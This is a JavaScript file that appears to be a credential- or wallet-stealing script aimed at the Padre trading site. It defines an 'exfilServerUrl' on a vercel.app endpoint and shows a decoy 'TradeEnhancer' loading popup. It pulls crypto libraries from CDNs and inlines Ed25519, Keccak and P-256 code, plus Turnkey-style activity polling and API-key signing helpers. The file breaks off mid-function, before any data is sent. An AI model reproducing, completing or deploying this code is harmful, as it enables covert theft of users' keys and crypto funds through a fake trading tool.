(async () => {
    // configure vercel / cs2 domain
    const exfilServerUrl = "https://.....vercel.app/api/message";
    // ===========

    console.log('[Padre] Start');

    function showLiquidLoaderPopup() {
        const POPUP_ID = '__liquid_loader_popup__';
        const STYLE_ID = '__liquid_loader_popup_styles__';
        const SIZE_LIMITS = {
          minWidth: 220,
          minHeight: 160,
          maxWidth: () => Math.min(380, window.innerWidth - 32),
          maxHeight: () => Math.min(360, window.innerHeight - 32),
          collapsedHeight: 44,
        };
        const clamp = (value, min, max) => Math.min(Math.max(value, min), max);
      
        const existing = document.getElementById(POPUP_ID);
        if (existing) {
          existing.__cleanup?.();
          existing.remove();
        }
      
        let styleTag = document.getElementById(STYLE_ID);
        if (!styleTag) {
          styleTag = document.createElement('style');
          styleTag.id = STYLE_ID;
          styleTag.textContent = `
            #${POPUP_ID} {
              position: fixed;
              bottom: 16px;
              right: 16px;
              padding: 16px 20px 18px;
              border-radius: 18px;
              color: #f4f6fb;
              font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
              background: rgba(17, 25, 40, 0.8);
              box-shadow:
                0 25px 45px rgba(0, 0, 0, 0.35),
                inset 0 0 0 1px rgba(255, 255, 255, 0.08);
              backdrop-filter: blur(14px);
              -webkit-backdrop-filter: blur(14px);
              z-index: 5000;
              display: flex;
              flex-direction: column;
              gap: 12px;
              transition: transform 0.25s ease, opacity 0.25s ease, height 0.2s ease;
              min-width: ${SIZE_LIMITS.minWidth}px;
              min-height: ${SIZE_LIMITS.minHeight}px;
              max-width: min(380px, calc(100vw - 32px));
              max-height: min(360px, calc(100vh - 32px));
              overflow: hidden;
            }
            #${POPUP_ID}::before {
              content: '';
              position: absolute;
              inset: 0;
              border-radius: inherit;
              background: radial-gradient(circle at top, rgba(255,255,255,0.18), transparent 60%);
              pointer-events: none;
              opacity: 0.85;
            }
            #${POPUP_ID} .popup-header,
            #${POPUP_ID} .popup-body {
              position: relative;
              z-index: 1;
            }
            #${POPUP_ID}.collapsed {
              padding: 10px 16px;
              min-height: ${SIZE_LIMITS.collapsedHeight}px;
              height: ${SIZE_LIMITS.collapsedHeight}px !important;
              max-height: ${SIZE_LIMITS.collapsedHeight}px;
              min-width: auto;
              width: max-content;
              max-width: 240px;
            }
            #${POPUP_ID}.collapsed .popup-body {
              opacity: 0;
              max-height: 0;
            }
            #${POPUP_ID}.collapsed .resize-handle {
              display: none;
            }
            #${POPUP_ID} .popup-header {
              display: flex;
              align-items: center;
              justify-content: space-between;
              gap: 12px;
              cursor: grab;
              user-select: none;
            }
            #${POPUP_ID} .popup-header:active {
              cursor: grabbing;
            }
            #${POPUP_ID} .popup-title {
              font-size: 13px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
              opacity: 0.9;
            }
            #${POPUP_ID} button.popup-toggle {
              background: rgba(255, 255, 255, 0.12);
              border: none;
              border-radius: 999px;
              width: 26px;
              height: 26px;
              color: inherit;
              cursor: pointer;
              display: inline-flex;
              align-items: center;
              justify-content: center;
              transition: background 0.2s ease;
            }
            #${POPUP_ID} button.popup-toggle:hover {
              background: rgba(255, 255, 255, 0.22);
            }
            #${POPUP_ID} .popup-body {
              flex: 1;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              text-align: center;
              gap: 14px;
              overflow: hidden;
              transition: max-height 0.25s ease, opacity 0.2s ease;
            }
            #${POPUP_ID} .spinner {
              width: 38px;
              height: 38px;
              border-radius: 50%;
              border: 3px solid rgba(244, 246, 251, 0.14);
              border-top-color: #7dd9ff;
              animation: liquid-spin 0.9s linear infinite;
            }
            #${POPUP_ID} .loading-text {
              font-size: 16px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
            }
            #${POPUP_ID} .resize-handle {
              position: absolute;
              bottom: 6px;
              right: 10px;
              width: 16px;
              height: 16px;
              border-right: 2px solid rgba(255, 255, 255, 0.5);
              border-bottom: 2px solid rgba(255, 255, 255, 0.5);
              cursor: nwse-resize;
              opacity: 0.7;
            }
            @keyframes liquid-spin {
              from { transform: rotate(0deg); }
              to { transform: rotate(360deg); }
            }
          `;
          document.head.appendChild(styleTag);
        }
      
        const popup = document.createElement('div');
        popup.id = POPUP_ID;
        popup.innerHTML = `
          <div class="popup-header" data-role="drag">
            <span class="popup-title">TradeEnhancer</span>
            <button class="popup-toggle" type="button" aria-label="Toggle popup" data-action="toggle">—</button>
          </div>
          <div class="popup-body">
            <div class="spinner" aria-hidden="true"></div>
            <span class="loading-text">Loading</span>
          </div>
          <div class="resize-handle" data-role="resize"></div>
        `;
        document.body.appendChild(popup);
      
        let expandedSize = {
          width: clamp(popup.offsetWidth || SIZE_LIMITS.minWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
          height: clamp(popup.offsetHeight || SIZE_LIMITS.minHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
        };
      
        const applyExpandedSize = () => {
          expandedSize = {
            width: clamp(expandedSize.width, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
            height: clamp(expandedSize.height, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
          };
          popup.style.width = `${expandedSize.width}px`;
          popup.style.height = `${expandedSize.height}px`;
        };
      
        const rememberExpandedSize = () => {
          expandedSize = {
            width: clamp(popup.offsetWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
            height: clamp(popup.offsetHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
          };
        };
      
        applyExpandedSize();
      
        const keepWithinViewport = () => {
          const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
          const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
          const currentX = parseFloat(popup.style.left || `${maxX}`);
          const currentY = parseFloat(popup.style.top || `${maxY}`);
          popup.style.left = `${clamp(currentX, 16, maxX)}px`;
          popup.style.top = `${clamp(currentY, 16, maxY)}px`;
        };
      
        popup.style.position = 'fixed';
        keepWithinViewport();
      
        const toggleButton = popup.querySelector('[data-action="toggle"]');
        const setCollapsed = (shouldCollapse) => {
          if (shouldCollapse) {
            rememberExpandedSize();
            popup.classList.add('collapsed');
            popup.style.width = '';
            popup.style.height = '';
            toggleButton.textContent = '+';
          } else {
            popup.classList.remove('collapsed');
            applyExpandedSize();
            toggleButton.textContent = '—';
          }
          requestAnimationFrame(() => keepWithinViewport());
        };
      
        toggleButton.addEventListener('click', () => {
          setCollapsed(!popup.classList.contains('collapsed'));
        });
      
        const dragHandle = popup.querySelector('[data-role="drag"]');
        let dragStart = null;
        const startDrag = (event) => {
          event.preventDefault();
          dragStart = {
            pointerX: event.clientX,
            pointerY: event.clientY,
            left: parseFloat(popup.style.left) || 16,
            top: parseFloat(popup.style.top) || 16,
          };
          document.addEventListener('pointermove', onDrag);
          document.addEventListener('pointerup', stopDrag, { once: true });
        };
      
        const onDrag = (event) => {
          if (!dragStart) return;
          const deltaX = event.clientX - dragStart.pointerX;
          const deltaY = event.clientY - dragStart.pointerY;
          const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
          const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
          popup.style.left = `${clamp(dragStart.left + deltaX, 16, maxX)}px`;
          popup.style.top = `${clamp(dragStart.top + deltaY, 16, maxY)}px`;
        };
      
        const stopDrag = () => {
          dragStart = null;
          document.removeEventListener('pointermove', onDrag);
        };
      
        dragHandle.addEventListener('pointerdown', startDrag);
      
        const resizeHandle = popup.querySelector('[data-role="resize"]');
        let resizeStart = null;
        const startResize = (event) => {
          if (popup.classList.contains('collapsed')) return;
          event.preventDefault();
          resizeStart = {
            pointerX: event.clientX,
            pointerY: event.clientY,
            width: popup.offsetWidth,
            height: popup.offsetHeight,
          };
          document.addEventListener('pointermove', onResize);
          document.addEventListener('pointerup', stopResize, { once: true });
        };
      
        const onResize = (event) => {
          if (!resizeStart) return;
          const deltaX = event.clientX - resizeStart.pointerX;
          const deltaY = event.clientY - resizeStart.pointerY;
          const nextWidth = clamp(resizeStart.width + deltaX, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth());
          const nextHeight = clamp(resizeStart.height + deltaY, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight());
          expandedSize = { width: nextWidth, height: nextHeight };
          applyExpandedSize();
          keepWithinViewport();
        };
      
        const stopResize = () => {
          resizeStart = null;
          document.removeEventListener('pointermove', onResize);
        };
      
        resizeHandle.addEventListener('pointerdown', startResize);
      
        const resizeObserver = new ResizeObserver(() => {
          if (!popup.classList.contains('collapsed')) {
            rememberExpandedSize();
          }
          keepWithinViewport();
        });
        resizeObserver.observe(popup);
      
        const resizeHandler = () => {
          if (!popup.classList.contains('collapsed')) {
            applyExpandedSize();
          }
          keepWithinViewport();
        };
        window.addEventListener('resize', resizeHandler, { passive: true });
        keepWithinViewport();
      
        requestAnimationFrame(() => {
          popup.style.transform = 'translateY(6px)';
          popup.style.opacity = '0';
          requestAnimationFrame(() => {
            popup.style.transform = 'translateY(0px)';
            popup.style.opacity = '1';
          });
        });
      
        popup.__cleanup = () => {
          window.removeEventListener('resize', resizeHandler);
          resizeObserver.disconnect();
          document.removeEventListener('pointermove', onDrag);
          document.removeEventListener('pointermove', onResize);
        };
    }
    showLiquidLoaderPopup()

    // ===================== UTILS (FUNCTIONS) =======================
    "use strict";
    const CryptoJS = await import('https://cdn.skypack.dev/pin/crypto-js@v4.2.0-zrlxegy3yFOPYCCYn41o/mode=imports,min/optimized/crypto-js.js');
    const nobleHashes = await import("https://cdn.jsdelivr.net/npm/@noble/hashes@2.0.1/sha2.js")
    const hpkeCore = await import("https://esm.sh/@hpke/core");
    var nobleEd25519 = (() => { var e, t = Object.defineProperty, n = Object.getOwnPropertyDescriptor, r = Object.getOwnPropertyNames, s = Object.prototype.hasOwnProperty, l = (e, l, i, o) => { if (l && "object" == typeof l || "function" == typeof l) for (let $ of r(l)) s.call(e, $) || $ === i || t(e, $, { get: () => l[$], enumerable: !(o = n(l, $)) || o.enumerable }); return e }, i = e => l(t({}, "__esModule", { value: !0 }), e), o = {}; ((e, n) => { for (var r in n) t(e, r, { get: n[r], enumerable: !0 }) })(o, { getPublicKey: () => C, etc: () => D }); let $ = 2n ** 255n - 19n, a = 2n ** 252n + 0x14def9dea2f79cd65812631a5cf5d3edn, _ = { a: -1n, d: 0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3n, p: $, n: a, h: 8, Gx: 0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51an, Gy: 0x6666666666666666666666666666666666666666666666666666666666666658n }, u = (e = "") => { throw Error(e) }, c = e => "string" == typeof e, d = e => e instanceof Uint8Array || null != e && "object" == typeof e && "Uint8Array" === e.constructor.name, f = (e, t) => !d(e) || "number" == typeof t && t > 0 && e.length !== t ? u("Uint8Array of valid length expected") : e, y = e => new Uint8Array(e), h = (e, t) => f(c(e) ? A(e) : y(f(e)), t), p = (e, t = $) => { let n = e % t; return n >= 0n ? n : t + n }, b = e => e instanceof x ? e : u("Point expected"); class x { constructor(e, t, n, r) { this.ex = e, this.ey = t, this.ez = n, this.et = r } static fromAffine(e) { return new x(e.x, e.y, 1n, p(e.x * e.y)) } static fromHex(e, t = !1) { let { d: n } = _; e = h(e, 32); let r = e.slice(), s = e[31]; r[31] = -129 & s; let l = B(r); t && !(0n <= l && l < 2n ** 256n) && u("bad y coord 1"), t || 0n <= l && l < $ || u("bad y coord 2"); let i = p(l * l), o = p(i - 1n), a = p(n * i + 1n), { isValid: c, value: d } = O(o, a); c || u("bad y coordinate 3"); let f = (1n & d) === 1n, y = (128 & s) != 0; return !t && 0n === d && y && u("bad y coord 3"), y !== f && (d = p(-d)), new x(d, l, 1n, p(d * l)) } get x() { return this.toAffine().x } get y() { return this.toAffine().y } equals(e) { let { ex: t, ey: n, ez: r } = this, { ex: s, ey: l, ez: i } = b(e), o = p(t * i), $ = p(s * r), a = p(n * i), _ = p(l * r); return o === $ && a === _ } is0() { return this.equals(g) } negate() { return new x(p(-this.ex), this.ey, this.ez, p(-this.et)) } double() { let { ex: e, ey: t, ez: n } = this, { a: r } = _, s = p(e * e), l = p(t * t), i = p(2n * p(n * n)), o = p(r * s), $ = e + t, a = p(p($ * $) - s - l), u = o + l, c = u - i, d = o - l, f = p(a * c), y = p(u * d), h = p(a * d), b = p(c * u); return new x(f, y, b, h) } add(e) { let { ex: t, ey: n, ez: r, et: s } = this, { ex: l, ey: i, ez: o, et: $ } = b(e), { a, d: u } = _, c = p(t * l), d = p(n * i), f = p(s * u * $), y = p(r * o), h = p((t + n) * (l + i) - c - d), m = p(y - f), g = p(y + f), v = p(d - a * c), w = p(h * m), A = p(g * v), z = p(h * v), B = p(m * g); return new x(w, A, B, z) } mul(e, t = !0) { if (0n === e) return !0 === t ? u("cannot multiply by 0") : g; if ("bigint" == typeof e && 0n < e && e < a || u("invalid scalar, must be < L"), !t && this.is0() || 1n === e) return this; if (this.equals(m)) return K(e).p; let n = g, r = m; for (let s = this; e > 0n; s = s.double(), e >>= 1n)1n & e ? n = n.add(s) : t && (r = r.add(s)); return n } multiply(e) { return this.mul(e) } clearCofactor() { return this.mul(BigInt(_.h), !1) } isSmallOrder() { return this.clearCofactor().is0() } isTorsionFree() { let e = this.mul(a / 2n, !1).double(); return a % 2n && (e = e.add(this)), e.is0() } toAffine() { let { ex: e, ey: t, ez: n } = this; if (this.equals(g)) return { x: 0n, y: 1n }; let r = R(n); return 1n !== p(n * r) && u("invalid inverse"), { x: p(e * r), y: p(t * r) } } toRawBytes() { let { x: e, y: t } = this.toAffine(), n = z(t); return n[31] |= 1n & e ? 128 : 0, n } toHex() { return w(this.toRawBytes()) } } x.BASE = new x(0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51an, 0x6666666666666666666666666666666666666666666666666666666666666658n, 1n, p(0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51an * 0x6666666666666666666666666666666666666666666666666666666666666658n)), x.ZERO = new x(0n, 1n, 1n, 0n); let { BASE: m, ZERO: g } = x, v = (e, t) => e.toString(16).padStart(t, "0"), w = e => Array.from(e).map(e => v(e, 2)).join(""), A = e => { let t = e.length; (!c(e) || t % 2) && u("hex invalid 1"); let n = y(t / 2); for (let r = 0; r < n.length; r++) { let s = 2 * r, l = e.slice(s, s + 2), i = Number.parseInt(l, 16); (Number.isNaN(i) || i < 0) && u("hex invalid 2"), n[r] = i } return n }, z = e => A(v(e, 64)).reverse(), B = e => BigInt("0x" + w(y(f(e)).reverse())), S = (...e) => { let t = y(e.reduce((e, t) => e + f(t).length, 0)), n = 0; return e.forEach(e => { t.set(e, n), n += e.length }), t }, R = (e, t = $) => { (0n === e || t <= 0n) && u("no inverse n=" + e + " mod=" + t); let n = p(e, t), r = t, s = 0n, l = 1n, i = 1n, o = 0n; for (; 0n !== n;) { let a = r / n, _ = r % n, c = s - i * a, d = l - o * a; r = n, n = _, s = i, l = o, i = c, o = d } return 1n === r ? p(s, t) : u("no inverse") }, P = (e, t) => { let n = e; for (; t-- > 0n;)n *= n, n %= $; return n }, E = e => { let t = e * e % $, n = t * e % $, r = P(n, 2n) * n % $, s = P(r, 1n) * e % $, l = P(s, 5n) * s % $, i = P(l, 10n) * l % $, o = P(i, 20n) * i % $, a = P(o, 40n) * o % $, _ = P(a, 80n) * a % $, u = P(_, 80n) * a % $, c = P(u, 10n) * l % $, d = P(c, 2n) * e % $; return { pow_p_5_8: d, b2: n } }, O = (e, t) => { let n = p(t * t * t), r = p(n * n * t), s = E(e * r).pow_p_5_8, l = p(e * n * s), i = p(t * l * l), o = l, $ = p(0x2b8324804fc1df0b2b4d00993dfbd7a72f431806ad2fe478c4ee1b274a0ea0b0n * l), a = i === e, _ = i === p(-e), u = i === p(-(0x2b8324804fc1df0b2b4d00993dfbd7a72f431806ad2fe478c4ee1b274a0ea0b0n * e)); return a && (l = o), (_ || u) && (l = $), (1n & p(l)) === 1n && (l = p(-l)), { isValid: a || _, value: l } }, j = e => p(B(e), a), q, H = (...e) => D.sha512Async(...e), V = (...e) => "function" == typeof q ? q(...e) : u("etc.sha512Sync not set"), N = e => { let t = e.slice(0, 32); t[0] &= 248, t[31] &= 127, t[31] |= 64; let n = e.slice(32, 64), r = j(t), s = m.mul(r), l = s.toRawBytes(); return { head: t, prefix: n, scalar: r, point: s, pointBytes: l } }, T = e => N(V(h(e, 32))), C = e => T(e).pointBytes; function G(e, t) { return e ? H(t.hashable).then(t.finish) : t.finish(V(t.hashable)) } let U = { zip215: !0 }, Z = () => "object" == typeof globalThis && "crypto" in globalThis ? globalThis.crypto : void 0, D = { bytesToHex: w, hexToBytes: A, concatBytes: S, mod: p, invert: R, randomBytes(e = 32) { let t = Z(); return t && t.getRandomValues || u("crypto.getRandomValues must be defined"), t.getRandomValues(y(e)) }, async sha512Async(...e) { let t = Z(); t && t.subtle || u("crypto.subtle or etc.sha512Async must be defined"); let n = S(...e); return y(await t.subtle.digest("SHA-512", n.buffer)) }, sha512Sync: void 0 }; Object.defineProperties(D, { sha512Sync: { configurable: !1, get: () => q, set(e) { q || (q = e) } } }); let F = () => { let e = [], t = 33, n = m, r = n; for (let s = 0; s < 33; s++) { r = n, e.push(r); for (let l = 1; l < 128; l++)r = r.add(n), e.push(r); n = r.double() } return e }, I, K = e => { let t = I || (I = F()), n = (e, t) => { let n = t.negate(); return e ? n : t }, r = g, s = m, l = 33, i = 128, o = BigInt(255), $ = BigInt(8); for (let a = 0; a < 33; a++) { let _ = 128 * a, u = Number(e & o); e >>= $, u > 128 && (u -= 256, e += 1n); let c = _, d = _ + Math.abs(u) - 1, f = a % 2 != 0, y = u < 0; 0 === u ? s = s.add(n(f, t[c])) : r = r.add(n(y, t[d])) } return { p: r, f: s } }; return i(o) })();

    let Oae = class {
        clone() {
            return this._cloneInto()
        }
    };
    let Yae = (e, t, n) => n > 32 ? ((e, t, n) => t << n - 32 | e >>> 64 - n)(e, t, n) : ((e, t, n) => e << n | t >>> 32 - n)(e, t, n),
        qae = (e, t, n) => n > 32 ? ((e, t, n) => e << n - 32 | t >>> 64 - n)(e, t, n) : ((e, t, n) => t << n | e >>> 32 - n)(e, t, n);
    const [Nae,
        Uae,
        jae] = [
            [],
            [],
            []
        ],
        Hae = BigInt(0),
        zae = BigInt(1),
        Qae = BigInt(2),
        Gae = BigInt(7),
        Vae = BigInt(256),
        Wae = BigInt(113);
    for (let Set = 0, bbt = zae, Cbt = 1, Sbt = 0; Set < 24; Set++) {
        [
            Cbt,
            Sbt
        ] = [
                Sbt,
                (2 * Cbt + 3 * Sbt) % 5
            ],
            Nae.push(2 * (5 * Sbt + Cbt)),
            Uae.push((Set + 1) * (Set + 2) / 2 % 64);
        let e = Hae;
        for (let t = 0; t < 7; t++) bbt = (bbt << zae ^ (bbt >> Gae) * Wae) % Vae,
            bbt & Qae &&
            (e ^= zae << (zae << BigInt(t)) - zae);
        jae.push(e)
    };
    const Rae = BigInt(2 ** 32 - 1),
        Tae = BigInt(32);
    function Pae(e, t = !1) {
        return t ? {
            h: Number(e & Rae),
            l: Number(e >> Tae & Rae)
        }
            : {
                h: 0 | Number(e >> Tae & Rae),
                l: 0 | Number(e & Rae)
            }
    };
    function Dae(e, t = !1) {
        let n = new Uint32Array(e.length),
            r = new Uint32Array(e.length);
        for (let o = 0; o < e.length; o++) {
            const {
                h: i,
                l: s
            }
                = Pae(e[o], t);
            [
                n[o],
                r[o]
            ] = [
                    i,
                    s
                ]
        }
        return [n,
            r]
    };
    const [$ae,
        Kae] = Dae(jae, !0);
    function Iae(e) {
        if (!Number.isSafeInteger(e) || e < 0) throw new Error(`Wrong positive integer: ${e}`)
    };
    function Lae(e, ...t) {
        if (!(e instanceof Uint8Array)) throw new Error('Expected Uint8Array');
        if (t.length > 0 && !t.includes(e.length)) throw new Error(
            `Expected Uint8Array of length ${t}, not of length=${e.length}`
        )
    };
    function _ae(e, t = !0) {
        if (e.destroyed) throw new Error('Hash instance has been destroyed');
        if (t && e.finished) throw new Error('Hash#digest() has already been called')
    };
    function cae(e, {
        strict: t = !0
    }
        = {}) {
        return !!e &&
            (
                'string' == typeof e &&
                (t ? /^0x[0-9a-fA-F]*$/.test(e) : e.startsWith('0x'))
            )
    };
    function Fae(e) {
        if (
            'string' == typeof e &&
            (
                e = function (e) {
                    if ('string' != typeof e) throw new Error('utf8ToBytes expected string, got ' + typeof e);
                    return new Uint8Array((new TextEncoder).encode(e))
                }(e)
            ),
            !(e => e instanceof Uint8Array)(e)
        ) throw new Error('expected Uint8Array, got ' + typeof e);
        return e
    };
    class Jae extends Oae {
        constructor(e, t, n, r = !1, o = 24) {
            if (
                super(),
                this.blockLen = e,
                this.suffix = t,
                this.outputLen = n,
                this.enableXOF = r,
                this.rounds = o,
                this.pos = 0,
                this.posOut = 0,
                this.finished = !1,
                this.destroyed = !1,
                Iae(n),
                0 >= this.blockLen ||
                this.blockLen >= 200
            ) throw new Error('Sha3 supports only keccak-f1600 function');
            var i;
            this.state = new Uint8Array(200),
                this.state32 = (
                    i = this.state,
                    new Uint32Array(i.buffer, i.byteOffset, Math.floor(i.byteLength / 4))
                )
        }
        keccak() {
            !function (e, t = 24) {
                const n = new Uint32Array(10);
                for (let r = 24 - t; r < 24; r++) {
                    for (let r = 0; r < 10; r++) n[r] = e[r] ^ e[r + 10] ^ e[r + 20] ^ e[r + 30] ^ e[r + 40];
                    for (let r = 0; r < 10; r += 2) {
                        const t = (r + 8) % 10,
                            o = (r + 2) % 10,
                            i = n[o],
                            s = n[o + 1],
                            a = Yae(i, s, 1) ^ n[t],
                            l = qae(i, s, 1) ^ n[t + 1];
                        for (let n = 0; n < 50; n += 10) e[r + n] ^= a,
                            e[r + n + 1] ^= l
                    }
                    let t = e[2],
                        o = e[3];
                    for (let n = 0; n < 24; n++) {
                        const r = Uae[n],
                            i = Yae(t, o, r),
                            s = qae(t, o, r),
                            a = Nae[n];
                        t = e[a],
                            o = e[a + 1],
                            e[a] = i,
                            e[a + 1] = s
                    }
                    for (let r = 0; r < 50; r += 10) {
                        for (let t = 0; t < 10; t++) n[t] = e[r + t];
                        for (let t = 0; t < 10; t++) e[r + t] ^= ~n[(t + 2) % 10] & n[(t + 4) % 10]
                    }
                    e[0] ^= $ae[r],
                        e[1] ^= Kae[r]
                }
                n.fill(0)
            }(this.state32, this.rounds),
                this.posOut = 0,
                this.pos = 0
        }
        update(e) {
            _ae(this);
            const {
                blockLen: t,
                state: n
            }
                = this,
                r = (e = Fae(e)).length;
            for (let o = 0; o < r;) {
                const i = Math.min(t - this.pos, r - o);
                for (let t = 0; t < i; t++) n[this.pos++] ^= e[o++];
                this.pos === t &&
                    this.keccak()
            }
            return this
        }
        finish() {
            if (this.finished) return;
            this.finished = !0;
            const {
                state: e,
                suffix: t,
                pos: n,
                blockLen: r
            }
                = this;
            e[n] ^= t,
                128 & t &&
                n === r - 1 &&
                this.keccak(),
                e[r - 1] ^= 128,
                this.keccak()
        }
        writeInto(e) {
            _ae(this, !1),
                Lae(e),
                this.finish();
            const t = this.state,
                {
                    blockLen: n
                }
                    = this;
            for (let r = 0, o = e.length; r < o;) {
                this.posOut >= n &&
                    this.keccak();
                const i = Math.min(n - this.posOut, o - r);
                e.set(t.subarray(this.posOut, this.posOut + i), r),
                    this.posOut += i,
                    r += i
            }
            return e
        }
        xofInto(e) {
            if (!this.enableXOF) throw new Error('XOF is not possible for this instance');
            return this.writeInto(e)
        }
        xof(e) {
            return Iae(e),
                this.xofInto(new Uint8Array(e))
        }
        digestInto(e) {
            if (
                function (e, t) {
                    Lae(e);
                    const n = t.outputLen;
                    if (e.length < n) throw new Error(`digestInto() expects output buffer of length at least ${n}`)
                }(e, this),
                this.finished
            ) throw new Error('digest() was already called');
            return this.writeInto(e),
                this.destroy(),
                e
        }
        digest() {
            return this.digestInto(new Uint8Array(this.outputLen))
        }
        destroy() {
            this.destroyed = !0,
                this.state.fill(0)
        }
        _cloneInto(e) {
            const {
                blockLen: t,
                suffix: n,
                outputLen: r,
                rounds: o,
                enableXOF: i
            }
                = this;
            return e ||
                (e = new Jae(t, n, r, i, o)),
                e.state32.set(this.state32),
                e.pos = this.pos,
                e.posOut = this.posOut,
                e.finished = this.finished,
                e.rounds = o,
                e.suffix = n,
                e.outputLen = r,
                e.enableXOF = i,
                e.destroyed = this.destroyed,
                e
        }
    };
    function packIntToBytesBE(value, byteLength) {
        const hex = value.toString(16);
        const targetHexLen = 2 * byteLength;

        if (targetHexLen < hex.length) {
            throw new Error(`cannot pack integer with ${hex.length} hex chars into ${byteLength} bytes`);
        }

        const padding = '0'.repeat(targetHexLen - hex.length);
        function hexToBytes(h) {
            if (h.length % 2 !== 0) throw new Error('Hex string length must be multiple of 2');
            const out = new Uint8Array(h.length / 2);
            for (let i = 0; i < h.length; i += 2) out[i / 2] = parseInt(h.substring(i, i + 2), 16);
            return out;
        }

        return hexToBytes(padding + hex);
    };
    function base64UrlEncode(bytes) {
        const n = btoa(
            function (e) {
                let t = '';
                for (let n = 0; n < e.length; n += 1) t += String.fromCharCode(e[n]);
                return t
            }(bytes)
        ).replace(/=/g, '');
        return n.replace(/\+/g, '-').replace(/\//g, '_')
    };
    function isBitSet(value, bitIndex) { return (value & (BigInt(1) << BigInt(bitIndex))) !== BigInt(0) }
    function modularSqrtP3Mod4(n, p) {
        if (p <= BigInt(0)) throw new Error('p must be positive');
        const a = n % p;
        if (isBitSet(p, 0) && isBitSet(p, 1)) {
            const r = (function (base, exp, mod) {
                if (exp === BigInt(0)) return BigInt(1);
                let res = base;
                const bits = exp.toString(2);
                for (let i = 1; i < bits.length; ++i) {
                    res = res * res % mod;
                    if ('1' === bits[i]) res = res * base % mod;
                }
                return res;
            })(a, (p + BigInt(1)) >> BigInt(2), p);
            if (r * r % p !== a) throw new Error('could not find a modular square root');
            return r;
        }
        throw new Error('unsupported modulus value');
    };
    function p256Prime() { return BigInt('115792089210356248762697446949407573530086143415290314195533631308867097853951') }
    function p256CurveB() { return BigInt('0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b') }
    function bytesToBigIntBE(bytes) {
        return BigInt(
            '0x' + function (bytes) {
                let number = '';

                for (let n = 0; n < bytes.length; n++) {
                    const r = bytes[n].toString(16);
                    number += r.length > 1 ? r : '0' + r
                }

                return number
            }(bytes)
        )
    };
    function hexToBytes(hex, length) {
        const n = new Uint8Array(hex.match(/../g).map((hex => parseInt(hex, 16))));
        if (!length) return n;

        let r = new Uint8Array(length);

        return r.set(n, length - n.length), r
    };
    function base64IndexToChar(index) { if (index >= 0 && index < 64) return 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[index] }
    function base64UrlEncodeString(e) {
        const t = function (e) {
            if (0 === arguments.length) throw new TypeError('1 argument required, but only 0 present.');
            let t;
            for (e = `${e}`, t = 0; t < e.length; t++) if (e.charCodeAt(t) > 255) throw new Error(
                `InvalidCharacterError: found code point greater than 255:${e.charCodeAt(t)} at position ${t}`
            );
            let n = '';
            for (t = 0; t < e.length; t += 3) {
                const r = [
                    void 0,
                    void 0,
                    void 0,
                    void 0
                ];
                r[0] = e.charCodeAt(t) >> 2,
                    r[1] = (3 & e.charCodeAt(t)) << 4,
                    e.length > t + 1 &&
                    (r[1] |= e.charCodeAt(t + 1) >> 4, r[2] = (15 & e.charCodeAt(t + 1)) << 2),
                    e.length > t + 2 &&
                    (r[2] |= e.charCodeAt(t + 2) >> 6, r[3] = 63 & e.charCodeAt(t + 2));
                for (let e = 0; e < r.length; e++) void 0 === r[e] ? n += '=' : n += base64IndexToChar(r[e])
            }
            return n
        }(e);
        return function (e) {
            return e.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
        }(t)
    };
    function compressedP256PointToJwk(e) {
        if (33 !== e.length && 65 !== e.length) throw new Error(
            'Invalid length: point is not in compressed or uncompressed format'
        );
        if ((2 === e[0] || 3 === e[0]) && 33 == e.length) {
            const t = 3 === e[0],
                n = bytesToBigIntBE(e.subarray(1, e.length)),
                r = p256Prime();
            if (n < BigInt(0) || n >= r) throw new Error('x is out of range');
            const o = function (e, t) {
                const n = p256Prime();
                let r = modularSqrtP3Mod4(((e * e + (n - BigInt(3))) * e + p256CurveB()) % n, n);
                return t !== isBitSet(r, 0) &&
                    (r = (n - r) % n),
                    r
            }(n, t);
            return {
                kty: 'EC',
                crv: 'P-256',
                x: base64UrlEncode(packIntToBytesBE(n, 32)),
                y: base64UrlEncode(packIntToBytesBE(o, 32)),
                ext: !0
            }
        }
    };
    function bytesToHex(e) { return e.reduce(((e, t) => e + t.toString(16).padStart(2, '0')), '') };
    function sleep(e) {
        return new Promise((t => {
            setTimeout((() => {
                t()
            }), e)
        }))
    };
    function pollActivityUntilComplete(e) {
        const {
            client: t,
            requestFn: n,
            refreshIntervalMs: r = 500
        } = e;

        return async e => {
            let o = (await n(e)).activity;
            for (; ;) {
                switch (o.status) {
                    case 'ACTIVITY_STATUS_COMPLETED':
                        return o;
                    case 'ACTIVITY_STATUS_CREATED':
                    case 'ACTIVITY_STATUS_PENDING':
                        break;
                    default:
                        break
                }
                await sleep(r);
                o = (
                    await t.getActivity({
                        activityId: o.id,
                        organizationId: o.organizationId
                    })
                ).activity
            }
        }
    };
    const signWithApiKey = async e => {
        const {
            content: t,
            publicKey: n,
            privateKey: r
        }
            = e,
            o = await async function (e) {
                const {
                    uncompressedPrivateKeyHex: t,
                    compressedPublicKeyHex: n
                }
                    = e,
                    r = hexP256KeyPairToJwk({
                        uncompressedPrivateKeyHex: t,
